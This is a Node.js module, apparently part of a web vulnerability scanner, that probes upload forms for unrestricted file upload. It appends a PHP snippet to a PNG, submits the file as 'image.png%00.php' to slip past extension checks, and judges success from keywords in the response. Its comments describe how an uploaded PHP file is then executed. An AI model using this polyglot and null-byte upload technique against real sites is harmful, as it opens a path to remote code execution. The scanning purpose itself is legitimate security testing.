/*
文件上传，关键是要知道文件的存储路径，访问才可以执行恶意代码，往往存在于上传图像的场景，
先暴力扫描出所有图像，然后额外判断两张图片的相似度来确认是否存在路径可以直接访问， 
执行方式：
1. 如果只是MIME类型过滤和客户端命名检查的话，可以通过直接访问来执行代码文件，命名为.php
2. 如果服务端进行了校验，那么需要结合其他文件包含的方式来执行代码

简易处理：能否将php后缀的文件传到服务器上，可以的话就报漏洞，自动化审计困难之处在于判断是否上传成功

*/
'use strict'
const RequestParser=require("../core/RequestParser.js")
const ResponseParser=require("../core/ResponseParser.js")
const { default: axios } = require("axios")
const fs = require("fs")
const FormData = require('form-data');
const {store_cookie} = require("../core/WebSpider.js")



async function Check(req=new RequestParser("http://127.0.0.1")){
    if(req.request.request_line.method==="GET"||req.request.data.includes("__File__")===false)
        return [false]
    var playload="<?php echo '__Alenkz12__';?>"  
    var result=[]
    var param=new URLSearchParams(req.request.data)
    var name=""
    var formData1 = new FormData()
    var formData2 = new FormData()
    for(let [key,value] of param){
        if(value==="__File__")
        {
            name=key
        }else{
            formData1.append(key,value)
            formData2.append(key,value)
        }
    }

    try{
       //文件上传
       {
        
        const imageBuffer = fs.readFileSync("src/assets/tai.png")
        imageBuffer.t
        const textBuffer = Buffer.from(playload, 'utf-8')
        const combinedData = Buffer.concat([imageBuffer, textBuffer])
    
        formData1.append(name,imageBuffer,"image.png")
        formData2.append(name, combinedData, {contentType: 'image/png',filename:'image.png%00.php'})
        
        let response1=  await axios({
            url:req.url,
            method:req.request.request_line.method,
            data:formData1,
            timeout:0,
            headers:{
                "Cookie":store_cookie[0],
                ...formData1.getHeaders(),
            },
        })

        let response2=  await axios({
            url:req.url,
            method:req.request.request_line.method,
            data:formData2,
            timeout:0,
            headers:{
                "Cookie":store_cookie[0],
                ...formData2.getHeaders(),
            },
        })
        var key_word=[/[ ]*成功[^a-zA-Z]/,/[ ]*Success[^a-zA-Z]/,/[ ]*SUCCESS[^a-zA-Z]/,/[ ]*success[^a-zA-Z]/,/[ ]*Ok[^a-zA-Z]/,/[ ]*OK[^a-zA-Z]/,/[ ]*ok[^a-zA-Z]/]
        // console.log(response1.data)
        // console.log(response2.data)
        var tag=false
        for(let value of key_word){
            // console.log(response1.data.match(value)!==null)
            // console.log(response2.data.match(value)!==null)
            // console.log("-----")
            if(response1.data.match(value)!==null){
                tag=true
                if(response2.data.match(value)!=null){
                    result.push(["",""])
                    break
                }
            }
        }
        if(tag==false)
            result.push(["可能存在漏洞，需进一步手工测试",""])
    
       
       }
     
    }catch(e){
    //   console.log("file upload")
    //   console.log(e)
    }

   
    if(result.length!==0)
        return [true].concat(result)
    else
        return [false]
    // 对于数组中的元素，第一个是触发方法，第二个是修复意见，如果没有的话就用默认的代替,可以接多个数组

}

module.exports=Check






